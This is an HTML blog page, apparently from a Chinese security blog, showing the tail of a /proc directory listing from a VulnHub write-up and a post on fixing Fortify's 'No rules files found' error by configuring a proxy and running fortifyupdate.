<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">comm</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">coredump_filter</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">cpuset</span>
<span class="nx">lrwxrwxrwx</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">cwd</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--------</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">environ</span>
<span class="nx">lrwxrwxrwx</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">exe</span>
<span class="nx">dr</span><span class="o">-</span><span class="nx">x</span><span class="o">------</span>   <span class="mi">2</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">fd</span>
<span class="nx">dr</span><span class="o">-</span><span class="nx">x</span><span class="o">------</span>   <span class="mi">2</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">fdinfo</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">gid_map</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--------</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">io</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">limits</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">loginuid</span>
<span class="nx">dr</span><span class="o">-</span><span class="nx">x</span><span class="o">------</span>   <span class="mi">2</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">map_files</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">maps</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-------</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">mem</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">mountinfo</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">mounts</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--------</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">mountstats</span>
<span class="nx">dr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span>   <span class="mi">5</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">net</span>
<span class="nx">dr</span><span class="o">-</span><span class="nx">x</span><span class="o">--</span><span class="nx">x</span><span class="o">--</span><span class="nx">x</span>   <span class="mi">2</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">ns</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">numa_maps</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">oom_adj</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">oom_score</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">oom_score_adj</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--------</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">pagemap</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--------</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">personality</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">projid_map</span>
<span class="nx">lrwxrwxrwx</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">root</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">sched</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">schedstat</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">sessionid</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">setgroups</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">smaps</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--------</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">stack</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">stat</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">statm</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">status</span>
</code></pre></div></div>


          <p><a href="/blog/2020/vulnhub-me-and-myGirlfriend/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/fortify/no-fules-file/found/"><h3 class="ctitle">「笔记」：fortify-error-no-rules-file-found</h3></a>
          <p><csmall>Jan 7, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>最近在接触代码审计的活儿。碰到了一些问题，随手记录下来。
错误描述：当fortify开始java代码分析时，报错No rules files found;</li>
</ul>

<h1 id="1错误描述">1.错误描述</h1>
<p>谷歌一波：</p>
<h2 id="问题引出">问题引出</h2>
<p>stackoverflow原问题：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nx">When</span> <span class="nx">I</span> <span class="nx">run</span> <span class="nx">a</span> <span class="nx">Fortify</span> <span class="nx">analysis</span> <span class="nx">against</span> <span class="nx">a</span> <span class="nx">Java</span> <span class="nx">project</span> <span class="nx">I</span> <span class="nx">receive</span> <span class="k">this</span> <span class="nx">error</span> <span class="p">:</span>
 <span class="p">[</span><span class="nx">warning</span><span class="p">]:</span> <span class="nx">No</span> <span class="nx">rules</span> <span class="nx">files</span> <span class="nx">found</span>
 <span class="p">[</span><span class="nx">error</span><span class="p">]:</span> <span class="nx">No</span> <span class="nx">rules</span> <span class="nx">files</span> <span class="nx">found</span>
 <span class="nx">Where</span> <span class="nx">can</span> <span class="nx">I</span> <span class="nx">configure</span> <span class="nx">the</span> <span class="nx">rules</span> <span class="nx">file</span> <span class="p">?</span>
</code></pre></div></div>
<p>原答案：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Navigate</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">bin</span> <span class="nx">folder</span> <span class="k">of</span> <span class="nx">your</span> <span class="nx">fortify</span> <span class="nx">installation</span>
<span class="nx">Enter</span> <span class="nx">scapostinstall</span>
<span class="nx">Enter</span> <span class="mi">2</span> <span class="nx">to</span> <span class="nx">select</span> <span class="nx">Settings</span>
<span class="nx">Enter</span> <span class="mi">2</span> <span class="nx">to</span> <span class="nx">select</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Host</span>
<span class="nx">Enter</span> <span class="nx">the</span> <span class="nx">name</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">proxy</span> <span class="nx">server</span>
<span class="nx">Enter</span> <span class="mi">3</span> <span class="nx">to</span> <span class="nx">select</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Port</span><span class="p">.</span>
<span class="nx">Enter</span> <span class="nx">the</span> <span class="nx">proxy</span> <span class="nx">server</span><span class="dl">'</span><span class="s1">s port number.
Exit and run fortifyupdate.cmd
</span></code></pre></div></div>
<p>原答案的意思就是说需要对fortify进行代理配置，(需科学上网)后进行规则库的下载配置。</p>

<h1 id="2解决问题">2.解决问题</h1>

<h2 id="配置代码">配置代码</h2>
<p>进入fortify安装的目录，对fortify进行代理配置，配置过程代码如下：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span><span class="nx">进入fortify的安装目录</span><span class="p">(</span><span class="nx">windows环境</span><span class="p">)</span>
<span class="nx">E</span><span class="p">:</span>
<span class="nx">cd</span> <span class="nx">fortify</span><span class="err">\</span><span class="nx">bin</span><span class="o">\</span>

<span class="nx">E</span><span class="p">:</span><span class="err">\</span><span class="nx">fortify</span><span class="err">\</span><span class="nx">bin</span><span class="o">&gt;</span><span class="nx">scapostinstall</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="nx">Migration</span><span class="p">...</span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="nx">Settings</span><span class="p">...</span>
<span class="p">[</span><span class="nx">s</span><span class="p">]</span> <span class="nx">Display</span> <span class="nx">all</span> <span class="nx">settings</span>
<span class="p">[</span><span class="nx">q</span><span class="p">]</span> <span class="nx">Exit</span>
<span class="nx">Please</span> <span class="nx">select</span> <span class="nx">the</span> <span class="nx">desired</span> <span class="nx">action</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="nx">s</span><span class="p">,</span><span class="nx">q</span><span class="p">):</span> <span class="mi">2</span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="nx">General</span><span class="p">...</span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="nx">Fortify</span> <span class="nx">Update</span><span class="p">...</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="nx">Software</span> <span class="nx">Security</span> <span class="nx">Center</span> <span class="nx">Settings</span><span class="p">...</span>
<span class="p">[</span><span class="nx">s</span><span class="p">]</span> <span class="nx">Display</span> <span class="nx">all</span> <span class="nx">settings</span>
<span class="p">[</span><span class="nx">r</span><span class="p">]</span> <span class="nx">Return</span>
<span class="p">[</span><span class="nx">q</span><span class="p">]</span> <span class="nx">Exit</span>
<span class="nx">Please</span> <span class="nx">select</span> <span class="nx">the</span> <span class="nx">desired</span> <span class="nx">action</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="nx">s</span><span class="p">,</span><span class="nx">r</span><span class="p">,</span><span class="nx">q</span><span class="p">):</span> <span class="mi">2</span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="nx">Update</span> <span class="nx">Server</span> <span class="nx">URL</span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Host</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Port</span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Username</span>
<span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Password</span>
<span class="p">[</span><span class="nx">s</span><span class="p">]</span> <span class="nx">Display</span> <span class="nx">all</span> <span class="nx">settings</span>
<span class="p">[</span><span class="nx">r</span><span class="p">]</span> <span class="nx">Return</span>
<span class="p">[</span><span class="nx">q</span><span class="p">]</span> <span class="nx">Exit</span>
<span class="nx">Please</span> <span class="nx">select</span> <span class="nx">the</span> <span class="nx">desired</span> <span class="nx">action</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="nx">s</span><span class="p">,</span><span class="nx">r</span><span class="p">,</span><span class="nx">q</span><span class="p">):</span> <span class="mi">2</span>

<span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Host</span> <span class="p">[</span><span class="k">default</span><span class="p">:</span> <span class="p">]:</span> <span class="nx">localhost</span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="nx">Update</span> <span class="nx">Server</span> <span class="nx">URL</span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Host</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Port</span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Username</span>
<span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Password</span>
<span class="p">[</span><span class="nx">s</span><span class="p">]</span> <span class="nx">Display</span> <span class="nx">all</span> <span class="nx">settings</span>
<span class="p">[</span><span class="nx">r</span><span class="p">]</span> <span class="nx">Return</span>
<span class="p">[</span><span class="nx">q</span><span class="p">]</span> <span class="nx">Exit</span>
<span class="nx">Please</span> <span class="nx">select</span> <span class="nx">the</span> <span class="nx">desired</span> <span class="nx">action</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="nx">s</span><span class="p">,</span><span class="nx">r</span><span class="p">,</span><span class="nx">q</span><span class="p">):</span> <span class="mi">3</span>

<span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Port</span> <span class="p">[</span><span class="k">default</span><span class="p">:</span> <span class="p">]:</span> <span class="mi">8080</span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="nx">Update</span> <span class="nx">Server</span> <span class="nx">URL</span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Host</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Port</span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Username</span>
<span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="nb">Proxy</span> <span class="nx">Server</span> <span class="nx">Password</span>
<span class="p">[</span><span class="nx">s</span><span class="p">]</span> <span class="nx">Display</span> <span class="nx">all</span> <span class="nx">settings</span>
<span class="p">[</span><span class="nx">r</span><span class="p">]</span> <span class="nx">Return</span>
<span class="p">[</span><span class="nx">q</span><span class="p">]</span> <span class="nx">Exit</span>
<span class="nx">Please</span> <span class="nx">select</span> <span class="nx">the</span> <span class="nx">desired</span> <span class="nx">action</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="nx">s</span><span class="p">,</span><span class="nx">r</span><span class="p">,</span><span class="nx">q</span><span class="p">):</span> <span class="nx">q</span>
</code></pre></div></div>
<p>以上fortify客户端配置代理结束，然后直接输入命令进行规则库下载更新：</p>

<h2 id="更新文件">更新文件</h2>
<p>输入fortifyupdate更新命令，更新代码如下：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">E</span><span class="p">:</span><span class="err">\</span><span class="nx">fortify</span><span class="err">\</span><span class="nx">bin</span><span class="o">&gt;</span><span class="nx">fortifyupdate</span><span class="p">.</span><span class="nx">cmd</span>
<span class="nx">Using</span> <span class="nx">proxy</span> <span class="nx">server</span><span class="p">:</span> <span class="nx">localhost</span><span class="p">:</span><span class="mi">8080</span>
<span class="nx">Storing</span> <span class="nx">Updated</span> <span class="nx">Security</span> <span class="nx">Content</span> <span class="p">...</span>
<span class="nx">E</span><span class="p">:</span><span class="err">\</span><span class="nx">fortify</span><span class="err">\</span><span class="nx">Core</span><span class="err">\</span><span class="nx">config</span><span class="err">\</span><span class="nx">rules</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">Annotations</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Extended</span><span class="p">,</span> <span class="nx">JSP</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">Classic</span> <span class="nx">ASP</span><span class="p">,</span> <span class="nx">VBScript</span><span class="p">,</span> <span class="nx">and</span> <span class="nx">VB6</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">ActionScript</span> <span class="mf">3.0</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">C</span><span class="o">/</span><span class="nx">C</span><span class="o">++</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Extended</span><span class="p">,</span> <span class="nx">Java</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">Android</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">COBOL</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Extended</span><span class="p">,</span> <span class="nx">C</span><span class="o">/</span><span class="nx">C</span><span class="o">++</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="p">.</span><span class="nx">NET</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span> <span class="nx">Preview</span><span class="p">,</span> <span class="nx">ABAP</span> <span class="nx">v2014</span><span class="p">.</span><span class="mf">4.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Extended</span><span class="p">,</span> <span class="nx">Configuration</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Extended</span><span class="p">,</span> <span class="nx">Content</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">Objective</span><span class="o">-</span><span class="nx">C</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">PHP</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">ABAP</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Extended</span><span class="p">,</span> <span class="nx">SQL</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">JavaScript</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">SQL</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
